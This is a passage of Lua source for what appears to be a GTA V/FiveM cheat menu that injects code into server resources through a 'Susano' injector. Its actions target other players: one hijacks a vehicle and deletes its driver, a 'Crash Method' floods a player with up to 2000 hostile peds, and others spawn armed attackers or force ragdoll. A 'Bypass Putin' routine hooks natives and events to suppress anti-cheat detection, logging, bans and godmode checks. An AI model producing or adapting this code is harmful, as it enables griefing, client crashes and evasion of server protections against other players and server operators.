        rawset(_G, 'warp_boost_busy', false)
        return
    end
    
    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end
    
    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end
    
    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end
    
    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)
    
    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end
    
    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
    
    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end
    
    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end
    
    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
    
    local takeoverSuccess = false
    local tStart = GetGameTimer()
    
    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)
        
        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end
        
        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end
        
        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end
        
        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end
        
        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end
    
    if takeoverSuccess then
        if DoesEntityExist(targetVehicle) and IsPedInVehicle(playerPed, targetVehicle, false) then
            RequestControl(targetVehicle, 1000)
            if NetworkHasControlOfEntity(targetVehicle) then
                FreezeEntityPosition(targetVehicle, true)
                SetVehicleEngineOn(targetVehicle, true, true, false)
                SetEntityCoordsNoOffset(targetVehicle, initialCoords.x, initialCoords.y, initialCoords.z + 1.0, false, false, false, false)
                SetEntityHeading(targetVehicle, initialHeading)
                SetEntityVelocity(targetVehicle, 0.0, 0.0, 0.0)
                Wait(100)
                FreezeEntityPosition(targetVehicle, false)
                SetVehicleOnGroundProperly(targetVehicle)
            end
        end
    end
    
    rawset(_G, 'warp_boost_busy', false)
end)
        ]], targetServerId)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionDeleteVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_busy') then return end
    rawset(_G, 'warp_boost_busy', true)

    local targetServerId = %d

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
    end
end

    if not targetPlayerId then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local takeoverSuccess = false
    local tStart = GetGameTimer()

    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end

    if takeoverSuccess then
        if DoesEntityExist(targetVehicle) then
            RequestControl(targetVehicle, 1000)
            SetEntityAsMissionEntity(targetVehicle, true, true)
            DeleteEntity(targetVehicle)

            SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
            SetEntityHeading(playerPed, initialHeading)
        end
    end

    local dist = #(GetEntityCoords(playerPed) - initialCoords)
    if dist > 10.0 then
        SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
    end

    rawset(_G, 'warp_boost_busy', false)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

do
    Actions.bugPlayerItem = FindItem("Online", "Troll", "Bug Player")
    if Actions.bugPlayerItem then
        Actions.bugPlayerItem.onClick = function(index, option)
            Menu.BugPlayerMode = option
            Menu.ActionBugPlayer()
    end
end

    Actions.ramPlayerItem = FindItem("Online", "Troll", "Ram Player")
    if Actions.ramPlayerItem then
        Actions.ramPlayerItem.onClick = function()
            Menu.ActionRamPlayer()
        end
    end

    Actions.crushItem = FindItem("Online", "Troll", "Crush")
    if Actions.crushItem then
        Actions.crushItem.onClick = function(index, option)
                            Menu.CrushMode = option
            Menu.ActionCrush()
    end
end

-- ============================================
-- PED FLOOD
-- ============================================

local pedFloodModel = "player_one"

function Menu.ActionPedFlood()
    if not Menu.SelectedPlayer then
        print("[PedFlood] ERROR: No player selected")
        return
    end

    local targetServerId = Menu.SelectedPlayer
    print("[PedFlood] Starting - target server ID: " .. tostring(targetServerId))

    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        print("[PedFlood] ERROR: Susano.InjectResource not available")
        return
    end

    print("[PedFlood] Injecting into resource...")

    Susano.InjectResource("any", string.format([[
        print("[PedFlood:Inject] Code injected, starting...")

        local susano = rawget(_G, "Susano")
        print("[PedFlood:Inject] Susano ref: " .. tostring(susano))
        if susano then
            print("[PedFlood:Inject] CreateSpoofedPed: " .. tostring(susano.CreateSpoofedPed))
        end

        local targetServerId = %d
        local spawnModel = "%s"

        -- Resolve target
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == targetServerId then
                targetPlayerId = player
                break
            end
        end
        if not targetPlayerId then
            print("[PedFlood:Inject] ERROR: Target player not found")
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            print("[PedFlood:Inject] ERROR: Target ped doesn't exist")
            return
        end
        print("[PedFlood:Inject] Target resolved: player=" .. tostring(targetPlayerId) .. " ped=" .. tostring(targetPed))

        -- Load model
        local modelHash = GetHashKey(spawnModel)
        print("[PedFlood:Inject] Model hash: " .. tostring(modelHash))
        RequestModel(modelHash)
        local t = 50
        while not HasModelLoaded(modelHash) and t > 0 do Wait(10); t = t - 1 end

        if not HasModelLoaded(modelHash) then
            print("[PedFlood:Inject] ERROR: Model failed to load after 500ms")
            return
        end
        print("[PedFlood:Inject] Model loaded OK")

        -- Kill previous flood
        if _G._pedFloodActive then
            print("[PedFlood:Inject] Killing previous flood...")
            _G._pedFloodActive = false
            Wait(300)
        end

        -- Init state
        _G._pedFloodStore = {}
        _G._pedFloodActive = true
        SetPedPopulationBudget(3)

        local PED_CAP = 2000
        local totalSpawned = 0
        local totalFailed = 0

        -- =============================================
        -- PHASE 1 : RETASK AMBIENT PEDS
        -- =============================================
        CreateThread(function()
            local pool = GetGamePool("CPed")
            local myPed = PlayerPedId()
            local retasked = 0
            for i, ped in ipairs(pool) do
                if DoesEntityExist(ped) and ped ~= myPed and ped ~= targetPed
                   and not IsPedAPlayer(ped) and not IsPedDeadOrDying(ped, true) then
                    ClearPedTasks(ped)
                    SetPedKeepTask(ped, true)
                    SetBlockingOfNonTemporaryEvents(ped, true)
                    SetPedCombatAttributes(ped, 46, true)
                    TaskCombatPed(ped, targetPed, 0, 16)
                    retasked = retasked + 1
                    if retasked %% 10 == 0 then Wait(0) end
                end
            end
            print("[PedFlood:Phase1] Retasked " .. retasked .. " ambient peds")
        end)

        -- =============================================
        -- PHASE 2 : SPAWN LOOP
        -- =============================================
        print("[PedFlood:Phase2] Starting 4 spawn threads...")

        for threadIdx = 1, 4 do
            CreateThread(function()
                Wait(threadIdx * 50)
                print("[PedFlood:Thread" .. threadIdx .. "] Started")

                while _G._pedFloodActive do
                    local store = _G._pedFloodStore
                    if store and #store >= PED_CAP then
                        Wait(1000)
                        -- Purge dead handles
                        local newStore = {}
                        for i, p in ipairs(store) do
                            if p and DoesEntityExist(p) then
                                newStore[#newStore + 1] = p
                            end
                            if i %% 50 == 0 then Wait(0) end
                        end
                        _G._pedFloodStore = newStore
                        print("[PedFlood:Thread" .. threadIdx .. "] Purged, now " .. #newStore .. " alive")
                    else
                        local tPed = GetPlayerPed(targetPlayerId)
                        if not DoesEntityExist(tPed) then
                            print("[PedFlood:Thread" .. threadIdx .. "] Target gone, stopping")
                            break
                        end
                        local tc = GetEntityCoords(tPed)

                        for b = 1, 3 do
                            local angle = math.random() * math.pi * 2
                            local radius = 1.0 + math.random() * 7.0
                            local x = tc.x + math.cos(angle) * radius
                            local y = tc.y + math.sin(angle) * radius

                            -- Ground Z check : évite spawn sous la map
                            local foundGround, groundZ = GetGroundZFor_3dCoord(x, y, tc.z + 5.0, false)
                            local z = foundGround and groundZ or tc.z

                            local heading = math.random(0, 360) + 0.0

                            -- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
                            -- SPAWN : arg7 = isNetwork = false (local only)
                            -- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
                            local ped = 0
                            if susano and type(susano.CreateSpoofedPed) == "function" then
                                ped = susano.CreateSpoofedPed(4, modelHash, x, y, z, heading, true, false)
                            else
                                ped = CreatePed(4, modelHash, x, y, z, heading, true, false)
                            end

                            if ped and ped ~= 0 and DoesEntityExist(ped) then
                                SetEntityAsMissionEntity(ped, true, true)
                                _G._pedFloodStore[#_G._pedFloodStore + 1] = ped

                                -- Config ped : visible, combat, anti-GC
                                SetBlockingOfNonTemporaryEvents(ped, true)
                                SetPedKeepTask(ped, true)
                                SetPedCombatAttributes(ped, 46, true)
                                SetPedCombatAttributes(ped, 5, true)
                                SetPedFleeAttributes(ped, 0, false)
                                SetPedSuffersCriticalHits(ped, false)
                                SetEntityMaxHealth(ped, 500)
                                SetEntityHealth(ped, 500)
                                DisablePedPainAudio(ped, true)

                                TaskCombatPed(ped, tPed, 0, 16)
                                totalSpawned = totalSpawned + 1
                            else
                                totalFailed = totalFailed + 1
                            end

                            -- Yield après chaque ped (anti script-hang)
                            Wait(10)
                        end

                        Wait(50)
                    end
                end

                print("[PedFlood:Thread" .. threadIdx .. "] Stopped. Spawned=" .. totalSpawned .. " Failed=" .. totalFailed)
            end)
        end

        -- Auto-stop 120s
        CreateThread(function()
            Wait(120000)
            _G._pedFloodActive = false
            print("[PedFlood] Auto-stop triggered. Total in store: " .. tostring(_G._pedFloodStore and #_G._pedFloodStore or 0))
        end)

        -- =============================================
        -- PHASE 3 : CLEANUP AUTO
        -- =============================================
        CreateThread(function()
            while _G._pedFloodActive do Wait(1000) end
            print("[PedFlood:Cleanup] Waiting 10s grace period...")
            Wait(10000)

            local store = _G._pedFloodStore
            local deleted = 0
            if store then
                for idx = 1, #store do
                    local ped = store[idx]
                    if ped and DoesEntityExist(ped) then
                        SetEntityAsMissionEntity(ped, true, true)
                        DeleteEntity(ped)
                        deleted = deleted + 1
                    end
                    if idx %% 15 == 0 then Wait(0) end
                end
            end
            _G._pedFloodStore = {}
            SetPedPopulationBudget(2)
            SetModelAsNoLongerNeeded(modelHash)
            print("[PedFlood:Cleanup] Done. Deleted " .. deleted .. " entities")
        end)

        print("[PedFlood:Inject] All threads launched")
    ]], targetServerId, pedFloodModel))

    print("[PedFlood] InjectResource call completed")
end

Actions.pedFloodItem = FindItem("Online", "Troll", "Crash Method")
if Actions.pedFloodItem then
    Actions.pedFloodItem.onClick = function()
        _Stealth.blockAC = true
        Menu.ActionPedFlood()
        Citizen.SetTimeout(140000, function()
            if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
        end)
    end
end

-- Ped Armed : spawn un ped armé d'un fusil à pompe sur la cible
-- Ragdoll : force le ragdoll sur la cible via Susano.RequestRagdoll
function Menu.ActionRagdoll()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end

            local guid = GetEntityGuid(targetPed)
            if guid and guid ~= 0 then
                Susano.RequestRagdoll(guid)
            end
        ]], targetServerId))
    end
end

function Menu.ActionPedArmed()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end
            local tc = GetEntityCoords(targetPed)

            -- Spoof en clown côté serveur
            local clownHash = 0x3C438FD2 -- s_m_y_clown_01
            RequestModel(clownHash)
            local tw = 50
            while not HasModelLoaded(clownHash) and tw > 0 do Wait(10); tw = tw - 1 end
            Susano.SpoofPed(clownHash, true)

            -- Modèle réel : civil basique (discret)
            local modelHash = GetHashKey("a_m_m_hillbilly_01")
            RequestModel(modelHash)
            local t = 50
            while not HasModelLoaded(modelHash) and t > 0 do Wait(10); t = t - 1 end
            if not HasModelLoaded(modelHash) then Susano.SpoofPed(0, false) return end

            -- Spawn juste derrière la cible (1.5m)
            local heading = GetEntityHeading(targetPed)
            local rad = math.rad(heading)
            local x = tc.x - math.sin(rad) * 1.5
            local y = tc.y + math.cos(rad) * 1.5

            local ped = CreatePed(4, modelHash, x, y, tc.z, heading + 180.0, true, false)
            if ped and ped ~= 0 then
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityMaxHealth(ped, 5000)
                SetEntityHealth(ped, 5000)
                SetPedSuffersCriticalHits(ped, false)
                SetPedCombatAttributes(ped, 46, true)
                SetPedCombatAttributes(ped, 5, true)
                SetPedFleeAttributes(ped, 0, false)
                SetBlockingOfNonTemporaryEvents(ped, true)
                SetPedKeepTask(ped, true)
                -- Fusil à pompe
                GiveWeaponToPed(ped, 0x1D073A89, 250, false, true) -- WEAPON_PUMPSHOTGUN
                -- Tir immédiat sur la cible
                TaskCombatPed(ped, targetPed, 0, 16)
            end

            -- Désactiver le spoof après spawn
            Wait(500)
            Susano.SpoofPed(0, false)

            SetModelAsNoLongerNeeded(modelHash)
            SetModelAsNoLongerNeeded(clownHash)
        ]], targetServerId))
    end
end

Actions.ragdollItem = FindItem("Online", "Troll", "Ragdoll")
if Actions.ragdollItem then
    Actions.ragdollItem.onClick = function()
        Menu.ActionRagdoll()
    end
end

-- [REMOVED] Actions.pedArmedItem handler (menu item deleted)
Actions.airstrikeItem = FindItem("Online", "Troll", "Airstrike")
if Actions.airstrikeItem then
    Actions.airstrikeItem.onClick = function(index, option)
        _Stealth.blockAC = true
        Menu.ActionAirstrike()
        Citizen.SetTimeout(10000, function()
            if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
        end)
    end
end

    Actions.bugVehicleItem = FindItem("Online", "Vehicle", "Bug Vehicle")
    if Actions.bugVehicleItem then
        Actions.bugVehicleItem.onClick = function(index, option)
        if option then
            Menu.BugVehicleMode = option
        end
            Menu.ActionBugVehicle()
    end
end

    Actions.warpItem = FindItem("Online", "Vehicle", "Warp")
    if Actions.warpItem then
        Actions.warpItem.onClick = function(index, option)
                            Menu.WarpMode = option
            Menu.ActionWarp()
    end
end

Actions.teleportIntoItem2 = FindItem("Online", "Vehicle", "Teleport Into")
if Actions.teleportIntoItem2 then
    Actions.teleportIntoItem2.onClick = function()
        Menu.ActionTeleportInto()
    end
end

    Actions.remoteVehicleItem = FindItem("Online", "Vehicle", "Remote Vehicle")
    if Actions.remoteVehicleItem then
        Actions.remoteVehicleItem.onClick = function()
            Menu.ActionRemoteVehicle()
    end
end

    Actions.stealVehicleItem = FindItem("Online", "Vehicle", "Steal Vehicle")
    if Actions.stealVehicleItem then
        Actions.stealVehicleItem.onClick = function()
            Menu.ActionStealVehicle()
    end
end

    Actions.npcDriveItem = FindItem("Online", "Vehicle", "NPC Drive")
    if Actions.npcDriveItem then
        Actions.npcDriveItem.onClick = function()
            Menu.ActionNPCDrive()
        end
    end

    Actions.deleteVehicleItem = FindItem("Online", "Vehicle", "Delete Vehicle")
    if Actions.deleteVehicleItem then
        Actions.deleteVehicleItem.onClick = function()
            Menu.ActionDeleteVehicle()
        end
    end

    Actions.kickVehicleItem = FindItem("Online", "Vehicle", "Kick Vehicle")
    if Actions.kickVehicleItem then
        Actions.kickVehicleItem.onClick = function(index, option)
        if option then
            Menu.KickVehicleMode = option
        end
            Menu.ActionKickVehicle()
    end
end

    Actions.removeAllTiresItem = FindItem("Online", "Vehicle", "remove all tires")
    if Actions.removeAllTiresItem then
        Actions.removeAllTiresItem.onClick = function()
            Menu.ActionRemoveAllTires()
        end
    end

    Actions.giveItem = FindItem("Online", "Vehicle", "Give")
    if Actions.giveItem then
        Actions.giveItem.onClick = function(index, option)
                            Menu.GiveMode = option
            Menu.ActionGive()
    end
end

    Actions.tpToItem = FindItem("Online", "Vehicle", "TP to")
    if Actions.tpToItem then
        Actions.tpToItem.onClick = function(index, option)
        if option then
            Menu.TPLocation = option
        end
            Menu.ActionTPTo()
        end
    end
end


CreateThread(function()
    while not Menu or not Menu.Categories do
        Wait(100)
    end
    
    local found = false
    local attempts = 0
    while not found and attempts < 50 do
        for _, cat in ipairs(Menu.Categories) do
            if cat.name == "Exploit" then
                found = true
                break
            end
        end
        if not found then
            Wait(100)
            attempts = attempts + 1
        end
    end
    
    if not found then
        return
    end
    
    Wait(500)
    
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Exploit" and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.name == "Bypasses" and tab.items then
                    for _, item in ipairs(tab.items) do
                        if item.name == "Bypass Putin" then
                            break
                        end
                    end
                end
            end
        end
    end
    
    Actions.testItem = FindItem("Exploit", "Bypass", "Bypass Putin")
    if Actions.testItem then
        Actions.testItem.onClick = function()
            local targetResource = "Putin"
            
            if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
                return
            end
            
            if not targetResource or GetResourceState(targetResource) ~= "started" then
                return
            end
            
            Susano.InjectResource(targetResource, [[
                local p = print
                local w = warn
                local e = error
                p = function() end
                w = function() end
                e = function() end
                
                if Citizen then
                    local t = Citizen.Trace
                    Citizen.Trace = function(m)
                        if m and type(m) == "string" then
                            local l = string.lower(m)
                            if string.find(l, "debug") or string.find(l, "detect") or 
                               string.find(l, "violation") or string.find(l, "cheat") or
                               string.find(l, "inject") or string.find(l, "hook") or
                               string.find(l, "susano") or string.find(l, "bypass") or
                               string.find(l, "ac:") or string.find(l, "anticheat") or
                               string.find(l, "ban") or string.find(l, "kick") or
                               string.find(l, "log") or string.find(l, "report") then
                                return
                            end
                        end
                        if t then t(m) end
                    end
                end
                
                local ts = TriggerServerEvent
                local te = TriggerEvent
                local ae = AddEventHandler
                local rn = RegisterNetEvent
                if TriggerServerEvent then
                    TriggerServerEvent = function(n, ...)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ban") or
                               string.find(l, "kick") or string.find(l, "log") or
                               string.find(l, "report") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if ts then return ts(n, ...) end
                    end
                end
                
                if TriggerEvent then
                    TriggerEvent = function(n, ...)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if te then return te(n, ...) end
                    end
                end
                
                if AddEventHandler then
                    AddEventHandler = function(n, h)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if ae then return ae(n, h) end
                    end
                end
                
                if RegisterNetEvent then
                    RegisterNetEvent = function(n)
                        if n and type(n) == "string" then
                            local l = string.lower(n)
                            if string.find(l, "detect") or string.find(l, "violation") or
                               string.find(l, "cheat") or string.find(l, "ac:") then
                                return
                            end
                        end
                        if rn then return rn(n) end
                    end
                end
                
                if exports then
                    local ex = exports
                    exports = setmetatable({}, {
                        __index = function(t, k)
                            local r = ex[k]
                            if type(r) == "table" then
                                return setmetatable({}, {
                                    __index = function(t2, k2)
                                        local f = r[k2]
                                        if type(f) == "function" then
                                            local lk = string.lower(tostring(k))
                                            local lk2 = string.lower(tostring(k2))
                                            if string.find(lk, "ac") or string.find(lk, "anticheat") or
                                               string.find(lk2, "detect") or string.find(lk2, "check") or
                                               string.find(lk2, "ban") or string.find(lk2, "kick") then
                                                return function() return true end
                                            end
                                        end
                                        return f
                                    end
                                })
                            end
                            return r
                        end
                    })
                end
                
                local origGetEntityProofs = GetEntityProofs
                GetEntityProofs = function(entity)
                    local playerPed = PlayerPedId()
                    if entity == playerPed then
                        return false, false, false, false, false, false, false, false
                    end
                    if origGetEntityProofs then
                        return origGetEntityProofs(entity)
                    end
                    return false, false, false, false, false, false, false, false
                end
                
                if CheckPlayerProofs then
                    local origCheckPlayerProofs = CheckPlayerProofs
                    CheckPlayerProofs = function()
                        return
                    end
                end
                
                if StartGodModeCheck then
                    local origStartGodModeCheck = StartGodModeCheck
                    StartGodModeCheck = function()
                        return
                    end
                end
                
                local _SetEntityHealthOriginal = SetEntityHealth
                if _SetEntityHealthOriginal then
                    _G._SetEntityHealthOriginal = _SetEntityHealthOriginal
                end
                
                SetEntityHealth = function(entity, health)
                    local playerPed = PlayerPedId()
                    if entity == playerPed then
                        if GameMode and GameMode.PlayerData then
                            GameMode.PlayerData.health = health
                        end
                        Citizen.InvokeNative(0x6B76DC1F3AE6E6A3, entity, health)
                        if GameMode and GameMode.PlayerData then
                            GameMode.PlayerData.health = health
                        end
                        return
                    end
                    if _SetEntityHealthOriginal then
                        return _SetEntityHealthOriginal(entity, health)
                    end
                    Citizen.InvokeNative(0x6B76DC1F3AE6E6A3, entity, health)
                end
                
                CreateThread(function()
                    while true do
                        Wait(0)
                        local playerPed = PlayerPedId()
                        if DoesEntityExist(playerPed) then
                            local currentHealth = GetEntityHealth(playerPed)
                            if GameMode and GameMode.PlayerData then
                                if not GameMode.PlayerData.health or GameMode.PlayerData.health < currentHealth then
                                    GameMode.PlayerData.health = currentHealth
                                end
                            end
                        end
                    end
                end)
            ]])
            
            Wait(50)
            
            Susano.InjectResource(targetResource, [[
                local s = rawget(_G, "Susano")
                if s and type(s) == "table" and type(s.HookNative) == "function" then
                    s.HookNative(0x2B40A976, function() return 0 end)
                    s.HookNative(0x5324A0E3E4CE3570, function() return false end)
                    s.HookNative(0x8DE82BC774F3B862, function() return nil end)
                    s.HookNative(0x2B1813BA58063D36, function() return "core" end)
                    
                    s.HookNative(0xFAEE099C6F890BB8, function(entity)
                        local playerPed = PlayerPedId()
                        if entity == playerPed then
                            return false, false, false, false, false, false, false, false
                        end
                        return true
                    end)
                    
                    if CheckPlayerProofs then
                        local origCheckPlayerProofs = CheckPlayerProofs
                        CheckPlayerProofs = function()
                            return
                        end
                    end
                    
                    if StartGodModeCheck then
                        local origStartGodModeCheck = StartGodModeCheck
                        StartGodModeCheck = function()
                            return
                        end
                    end
                end
                
                local pr = {
                    ["TriggerEvent"] = true, ["Wait"] = true, ["Citizen"] = true,
                    ["CreateThread"] = true, ["GetEntityCoords"] = true,
                    ["PlayerPedId"] = true, ["GetHashKey"] = true
                }
                
                local bp = {"detect", "check", "ban", "kick", "log", "report", "monitor", "track", "verify", "ac", "anticheat"}
                
                for n, f in pairs(_G) do
                    if not pr[n] and type(f) == "function" then
                        local nl = string.lower(tostring(n))
                        for _, p in ipairs(bp) do
                            if string.find(nl, p) then
                                _G[n] = function() return true end
                                break
                            end
                        end
                    end
                end
            ]])
            
            Wait(50)

            Susano.InjectResource("Putin", [[
_zeubiiii = TriggerServerEvent
_zouzzie = GetStateBagValue

GetEntityScript = nil
IsEntityGhostedToLocalPlayer = nil

TriggerServerEvent = function(eventName, ...)
    print('TRIGGER EVENT ->', eventName, ...)
    if eventName:find('PutinAC') then
        return
    end
    return _zeubiiii(eventName, ...)
end

GetInvokingResource = function()
    return nil
end

GetStateBagValue = function(bag, key)
    if key == 'doCheckPlayerPed' then
        return false
    end
    return _zouzzie(bag, key)
end
]])

        end
    else
    end
end)

do
    local tpSelector = FindItem("Exploit", "Exploits", "Teleport To")

    if tpSelector then
        tpSelector.onClick = function(index, option)
            if option == "Waypoint" then
                Menu.ActionTPToWaypoint()
            elseif option == "FIB Building" then
                Menu.ActionTPToFIB()
            elseif option == "Mission Row PD" then
                Menu.ActionTPToMissionRowPD()
            elseif option == "Pillbox Hospital" then
                Menu.ActionTPToPillboxHospital()
            elseif option == "Grove Street" then
                Menu.ActionTPToGroveStreet()
            elseif option == "Legion Square" then
                Menu.ActionTPToLegionSquare()
            end
    end
end


    Actions.staffModeItem = FindItem("Exploit", "Exploits", "Staff Mode")
    if Actions.staffModeItem then
        Actions.staffModeItem.onClick = function(value)
            Menu.StaffModeEnabled = value
            if value then
                CreateThread(function()
                    while Menu.StaffModeEnabled do
                        Wait(0)
                        if IsPedShooting(PlayerPedId()) or IsControlJustPressed(0, 24) then
                            local playerPed = PlayerPedId()
                            local camPos = GetGameplayCamCoord()
                            local camRot = GetGameplayCamRot(2)
                            
                            local function RotationToDirection(rotation)
